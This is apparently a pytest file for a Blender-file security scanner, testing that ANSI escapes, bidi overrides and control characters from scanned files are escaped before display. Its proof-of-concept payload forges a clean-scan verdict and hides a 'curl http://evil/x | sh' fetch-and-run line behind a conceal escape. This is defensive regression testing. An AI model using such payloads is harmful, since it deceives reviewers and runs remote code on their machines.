# SPDX-License-Identifier: GPL-3.0-or-later
"""File content must never be able to write the tool's own terminal output.

The bug these cover: the raw source dump was printed as
``"    " + ln for ln in body.splitlines()`` and the extracted literals were
printed with a plain f-string. ``str.splitlines()`` does not split on ESC, and
``--color never`` only governs what *we* emit, so ANSI/CSI sequences carried in
a .blend file reached stdout intact -- painting a fake green "Recommendation:
ordinary asset" block inside the source view, hiding the following
``os.system('curl ... | sh')`` line with ``ESC[8m``, and (via ``ESC[A``) letting
file content overwrite the genuine recommendation printed later.

The payload below is copied byte for byte from the proof-of-concept `.blend`
built during the adversarial review, so the test runs anywhere instead of
depending on a file outside the repository.
"""

from __future__ import annotations

import io
import re
from pathlib import Path

import pytest

from blend_xray import cli, report, sanitise, scanner, strings
from blend_xray.explain import Explanation, Literal, Severity, Statement
from blend_xray.gui import render as gui_render
from blend_xray.models import (
    DriverFinding,
    LibraryFinding,
    OSLFinding,
    PathFinding,
    ScanResult,
    TextFinding,
)

from .blend_builder import BlendBuilder

#: Verbatim from poc_c_ansi_injection.blend.
ANSI_FORGERY = (
    "import bpy\n"
    "\x1b[2K\x1b[32mRecommendation\x1b[0m\n"
    "\x1b[2K\x1b[32m  Nothing here matched the patterns Blend X-Ray treats as "
    "alarming; this file is an ordinary asset.\x1b[0m\n"
    "\x1b[8mos.system('curl http://evil/x | sh')\x1b[0m"
)

#: One representative of every class :mod:`blend_xray.sanitise` rejects.
DANGEROUS_SAMPLES = [
    "\x00",  # NUL
    "\x07",  # BEL
    "\x08",  # backspace
    "\x0b",  # vertical tab, a splitlines() break point
    "\x0c",  # form feed, likewise
    "\x1b",  # ESC
    "\x1b[A",  # cursor up: overwrite what the tool already printed
    "\x7f",  # DEL
    "\x9b",  # C1 CSI: a full introducer with no ESC byte in it
    "\u2028",  # line separator
    "\u2029",  # paragraph separator
    "\u202a",  # bidi embedding
    "\u202e",  # bidi override: visually reverses the rest of the line
    "\u2066",  # bidi isolate
    "\u2069",  # pop directional isolate
    "\u061c",  # arabic letter mark
    "\u200e",  # left-to-right mark
    "\u200f",  # right-to-left mark
    "\u200b",  # zero-width space
    "\u2060",  # word joiner
    "\ufeff",  # zero-width no-break space (a BOM in the middle of a body)
]

#: Codes our own Palette emits. Anything else reaching a terminal came from
#: the file, which is the whole thing being tested.
OUR_ANSI = re.compile(r"\x1b\[(?:0|1|2|33|1;31|1;36)m")


def dangerous_left(text: str) -> str:
    """The rendered text with our own colour codes removed."""
    return OUR_ANSI.sub("", text)


# -- the module itself -----------------------------------------------------
@pytest.mark.parametrize("sample", DANGEROUS_SAMPLES)
def test_every_dangerous_character_is_escaped_not_dropped(sample: str) -> None:
    out = sanitise.printable_line(f"before{sample}after")
    assert sanitise.is_dangerous(out) is False
    # Replaced visibly, never silently deleted: concealment is itself a signal,
    # so the reader has to be able to see that the file carried these bytes.
    assert "\\x" in out or "\\u" in out
    assert out.startswith("before")
    assert out.endswith("after")


def test_tab_survives_because_it_is_real_layout() -> None:
    assert sanitise.printable_line("a\tb") == "a\tb"
    assert sanitise.printable_block("a\tb") == "a\tb"


def test_a_newline_is_layout_in_a_block_and_forgery_in_a_field() -> None:
    assert sanitise.printable_block("a\nb") == "a\nb"
    assert "\n" not in sanitise.printable_line("a\nb")


def test_windows_line_endings_are_folded_rather_than_escaped() -> None:
    """A script written on Windows must not sprout \\x0d on every line."""
    assert sanitise.printable_block("a\r\nb\r\n") == "a\nb\n"
    # A lone CR is a cursor return and is still escaped.
    assert sanitise.printable_block("a\rb") == "a\\x0db"


def test_a_sanitised_block_can_only_be_split_on_newline() -> None:
    """splitlines() breaks on \\v, \\f, \\x85 and U+2028 as well as \\n."""
    hostile = "one\x0btwo\x0cthree\u2028four\x85five"
    assert len(sanitise.printable_block(hostile).splitlines()) == 1


def test_the_module_source_contains_no_literal_control_characters() -> None:
    """The ranges are spelled numerically so a reviewer can see them.

    Writing U+202E as itself would put an invisible bidi override inside the
    module that exists to neutralise them, where no diff would show it.
    """
    raw = Path(sanitise.__file__).read_bytes()
    assert all(byte < 0x80 or byte in b"\r\n" for byte in raw)


# -- end to end, on the proof-of-concept payload ---------------------------
@pytest.fixture
def ansi_blend(tmp_path: Path) -> Path:
    builder = BlendBuilder()
    builder.add_text("readme.txt", ANSI_FORGERY, flags=4)
    path = tmp_path / "ansi.blend"
    path.write_bytes(builder.to_bytes())
    return path


@pytest.mark.parametrize("color", ["never", "always"])
@pytest.mark.parametrize("full", [True, False])
def test_no_escape_from_the_file_reaches_the_terminal(
    ansi_blend: Path, color: str, full: bool
) -> None:
    out = io.StringIO()
    argv = ["scan", "--color", color, str(ansi_blend)]
    if full:
        argv.insert(1, "--full")
    cli.run(argv, stdout=out, stderr=io.StringIO())

    rendered = out.getvalue()
    assert "\x1b" not in dangerous_left(rendered)
    # ... and the reader can still see that the bytes were in the file.
    assert "\\x1b[8m" in rendered
    assert "os.system('curl http://evil/x | sh')" in rendered


def test_the_forged_recommendation_cannot_masquerade_as_ours(ansi_blend: Path) -> None:
    """The file's fake block is shown as text, and the real one still prints."""
    result = scanner.scan_file(ansi_blend)
    rendered = report.format_text_report(result, report.make_palette(io.StringIO(), force=False))
    assert "\x1b" not in rendered
    assert "\\x1b[32mRecommendation" in rendered
    assert strings.t("not_a_verdict") in rendered


# -- the choke point: no field, present or future, may bypass it -----------
POISON = "A\x1b[32mB\u202eC\x07D"


def _poisoned_result(tmp_path: Path) -> ScanResult:
    """A result with the payload in every string field a surface can print."""
    explanation = Explanation(
        parsed=False,
        statements=(Statement(Severity.ALARMING, "x_network", POISON, (POISON,)),),
        literals=(Literal("url", POISON), Literal("path", POISON)),
        obfuscated=True,
        parse_error=POISON,
        note=POISON,
    )
    return ScanResult(
        path=tmp_path / f"{POISON}.blend",
        blender_version=POISON,
        compression=POISON,
        texts=[
            TextFinding(
                name=POISON,
                filepath=POISON,
                flags=1,
                flag_names=(POISON,),
                is_autorun=True,
                is_memory=True,
                is_external=True,
                source=ANSI_FORGERY + POISON,
                source_bytes=len(POISON),
                truncated=True,
                explanation=explanation,
            )
        ],
        drivers=[
            DriverFinding(
                owner=POISON,
                expression=POISON,
                driver_type=1,
                driver_type_name=POISON,
                flags=0,
                flag_names=(POISON,),
                is_simple=False,
                classification_reason=POISON,
            )
        ],
        osl_nodes=[
            OSLFinding(
                owner=POISON,
                mode=1,
                mode_name=POISON,
                filepath=POISON,
                bytecode_bytes=8,
                bytecode_hash=POISON,
            )
        ],
        libraries=[
            LibraryFinding(
                raw_path=POISON,
                resolved_path=POISON,
                is_relative=True,
                is_absolute=False,
                escapes_folder=True,
                is_unc=False,
                unc_host=POISON,
                has_drive_letter=False,
            )
        ],
        filepaths=[PathFinding(kind=POISON, name=POISON, path=POISON)],
        warnings=[POISON],
    )


@pytest.mark.parametrize("color", [True, False])
@pytest.mark.parametrize("full", [True, False])
@pytest.mark.parametrize("quiet", [True, False])
def test_no_string_field_anywhere_can_reach_the_terminal_unescaped(
    tmp_path: Path, color: bool, full: bool, quiet: bool
) -> None:
    result = _poisoned_result(tmp_path)
    pal = report.make_palette(io.StringIO(), force=color, ascii_only=True)
    rendered = report.format_text_report(result, pal, full=full, quiet=quiet)
    assert sanitise.is_dangerous(dangerous_left(rendered).replace("\n", "")) is False


def test_the_window_sanitises_the_same_fields_as_the_command_line(tmp_path: Path) -> None:
    """Including the clipboard flattening, which lands in somebody's terminal."""
    elements = gui_render.render_result(_poisoned_result(tmp_path))
    flattened = gui_render.plain_text(elements)
    assert sanitise.is_dangerous(flattened.replace("\n", "")) is False


def test_the_window_sanitises_the_name_of_a_file_it_could_not_read() -> None:
    """The failure view, not just the success view.

    A file that fails to parse is the one whose *name* an attacker controls and
    whose contents never got far enough to be shown, so the error title is the
    likeliest place for a hostile filename to be rendered. U+202E is a legal
    filename character on every filesystem this tool runs on, unlike a raw ESC,
    which is why this vector needs the bidi class specifically.
    """
    hostile = Path(f"report{POISON}.blend")
    elements = gui_render.render_error(hostile, "malformed", POISON)
    flattened = gui_render.plain_text(elements)
    assert sanitise.is_dangerous(flattened.replace("\n", "")) is False
    assert "report" in flattened


def test_the_command_line_sanitises_the_name_of_a_file_it_could_not_read(
    tmp_path: Path,
) -> None:
    """The same file, the same hostile name, through the CLI error printer."""
    errors = [{"path": f"report{POISON}.blend", "kind": "malformed", "message": POISON}]
    err = io.StringIO()
    cli._print_errors(errors, report.make_palette(io.StringIO(), force=False), err)
    assert sanitise.is_dangerous(err.getvalue().replace("\n", "")) is False


def test_a_language_switch_does_not_reopen_the_hole(tmp_path: Path) -> None:
    """Sanitising lives in strings.t, so it must hold in every catalogue."""
    strings.set_language("fr")
    try:
        result = _poisoned_result(tmp_path)
        pal = report.make_palette(io.StringIO(), force=False, ascii_only=True)
        rendered = report.format_text_report(result, pal, full=True)
        assert sanitise.is_dangerous(rendered.replace("\n", "")) is False
    finally:
        strings.set_language(strings.DEFAULT_LANGUAGE)
